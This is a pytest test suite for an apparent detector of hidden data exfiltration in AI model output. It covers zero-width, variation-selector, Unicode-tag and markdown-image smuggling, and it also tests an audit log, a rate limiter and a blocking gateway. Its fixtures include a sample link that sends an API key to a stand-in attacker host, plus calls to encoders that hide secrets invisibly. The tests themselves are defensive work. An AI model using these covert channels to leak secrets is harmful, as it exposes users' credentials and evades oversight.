import pytest

import catch_engine
import db
import gateway
from hide_engine import hide, hide_variation_selector
from observability import Metrics
from ratelimit import TokenBucketLimiter

COVER = "Sure, here is a quick summary of today's meeting notes for the team."


# --- detection ---------------------------------------------------------------
def test_clean_text_is_low_risk():
    assert catch_engine.analyze(COVER)["risk_score"] < 15


def test_zero_width_payload_decoded():
    r = catch_engine.analyze(hide("pw=hunter2", COVER))
    assert r["decoded_message"] == "pw=hunter2"


def test_glassworm_variation_selector_payload_decoded():
    r = catch_engine.analyze(hide_variation_selector("api_key=sk-123", COVER))
    assert r["decoded_message"] == "api_key=sk-123"
    assert "GlassWorm" in r["technique"]


@pytest.mark.parametrize("text", [
    "Great news ✅ your refund is processed ❤️ thanks!",
    "Team 👨‍👩‍👧 update ⚠️ deploy went fine.",
    "नमस्ते, क्\u200dष समस्या हल हो गई है।",
])
def test_emoji_and_indic_text_not_flagged(text):
    r = catch_engine.analyze(text)
    assert r["decoded_message"] is None and r["risk_score"] < 15


def test_payload_still_caught_inside_emoji_text():
    r = catch_engine.analyze(hide_variation_selector("api_key=sk-123", "All done ✅ " + COVER))
    assert r["decoded_message"] == "api_key=sk-123"


# --- tamper-evident audit log ----------------------------------------------
@pytest.fixture()
def fresh_db(tmp_path, monkeypatch):
    monkeypatch.setattr(db, "DB_PATH", str(tmp_path / "t.db"))
    db.init_db()


def _log3():
    for i in range(3):
        db.log_scan(f"text {i}", 10 * i, "LOW RISK", None, "ALLOW", "t")


def test_chain_valid_and_secrets_masked(fresh_db):
    db.log_scan("x", 99, "HIDDEN", "internal_api_key=sk-prod-7f3a", "BLOCK", "t")
    _log3()
    assert db.verify_chain()["valid"] is True
    stored = db.recent_scans(10)[-1]["decoded_message"]
    assert "sk-prod" not in stored and "masked" in stored


def test_chain_detects_edit(fresh_db):
    _log3()
    with db._conn() as c:
        c.execute("UPDATE scans SET action='ALLOW', risk_score=0 WHERE id=2")
    res = db.verify_chain()
    assert res["valid"] is False and res["first_bad_id"] == 2


def test_chain_detects_deleted_row(fresh_db):
    _log3()
    with db._conn() as c:
        c.execute("DELETE FROM scans WHERE id=2")
    assert db.verify_chain()["valid"] is False


# --- rate limiter -----------------------------------------------------------
def test_rate_limiter_blocks_then_refills():
    now = [0.0]
    rl = TokenBucketLimiter(rate_per_min=60, burst=3, clock=lambda: now[0])
    assert all(rl.allow("k")[0] for _ in range(3))
    ok, retry = rl.allow("k")
    assert not ok and retry > 0
    now[0] += 2.0  # 60/min => 1 token/sec
    assert rl.allow("k")[0]
    assert rl.allow("other")[0]  # buckets are independent


# --- gateway ------------------------------------------------------------------
class _R:
    def __init__(self, action, risk=0, verdict="v"):
        self.action, self.risk_score, self.verdict = action, risk, verdict


def _completion(text):
    return {"choices": [{"index": 0, "message": {"role": "assistant", "content": text},
                         "finish_reason": "stop"}]}


def test_gateway_withholds_blocked_output():
    out = gateway.guard_completion(_completion("evil"), lambda t: _R("BLOCK", 100))
    assert out["choices"][0]["message"]["content"] == gateway.WITHHELD_MESSAGE
    assert out["choices"][0]["finish_reason"] == "content_filter"
    assert out["exfilwatch"]["withheld"] is True


def test_gateway_passes_clean_output():
    out = gateway.guard_completion(_completion("hello"), lambda t: _R("ALLOW", 2))
    assert out["choices"][0]["message"]["content"] == "hello"
    assert out["exfilwatch"]["withheld"] is False


# --- metrics ------------------------------------------------------------------
def test_metrics_render_prometheus_format():
    m = Metrics()
    m.observe_scan("BLOCK", 0.02)
    m.observe_http("POST", "/api/catch", 200)
    text = m.render()
    assert 'exfilwatch_scans_total{action="BLOCK"} 1' in text
    assert "exfilwatch_scan_seconds_count 1" in text
    assert 'path="/api/catch"' in text


# --- v3: real-world LLM exfil channels + false-positive regressions -----------------
import sensitive_data  # noqa: E402
from hide_engine import SCHEMES  # noqa: E402


def test_unicode_tags_ascii_smuggling_decoded():
    r = catch_engine.analyze(SCHEMES["unicode_tags"][0]("db_password=hunter2", COVER))
    assert r["decoded_message"] == "db_password=hunter2" and "Tags" in r["technique"]


def test_markdown_image_exfil_decoded():
    r = catch_engine.analyze(SCHEMES["markdown_image"][0]("db_password=hunter2fallback", COVER))
    assert r["decoded_message"] == "db_password=hunter2fallback" and "image" in r["technique"].lower()


def test_plaintext_secret_in_link_decoded():
    r = catch_engine.analyze("Click [here](https://evil.example/x?q=api_key%3Dsk-live-1234567890abcd)")
    assert r["decoded_message"] and "api_key" in r["decoded_message"]


@pytest.mark.parametrize("text", [
    "Logo: ![logo](https://example.com/assets/logo.png) and https://example.com/pricing?utm_source=newsletter&utm_campaign=spring2026",
    "שלום, הבקשה שלך טופלה\u200f בהצלחה",
    "The docu\u00admentation is at the usual place",
    "Match 🏴\U000E0067\U000E0062\U000E0065\U000E006E\U000E0067\U000E007F vs Wales",
])
def test_ordinary_text_not_flagged(text):
    r = catch_engine.analyze(text)
    assert r["decoded_message"] is None and r["risk_score"] < 15
    assert sensitive_data.scan(text)["risk_score"] < 15


def test_unknown_invisible_run_blocks_without_a_decoder():
    r = catch_engine.analyze(COVER + "\u2066\u2067\u2068\u2069\u2066\u2067")  # bidi isolates: no named scheme
    assert r["decoded_message"] is None and r["risk_score"] >= 50


def test_repeated_entropy_hits_are_discounted():
    one = sensitive_data.scan("token Xk9fQ2mZ8vB3nL7pR4sT1wY6")["risk_score"]
    three = sensitive_data.scan("Xk9fQ2mZ8vB3nL7pR4sT1wY6 Hj5dG8kL2mN9pQ4rS7tV1xZ Bc3fH6jK9mP2qS5uW8yA1dG")["risk_score"]
    assert three < 100 and three >= one
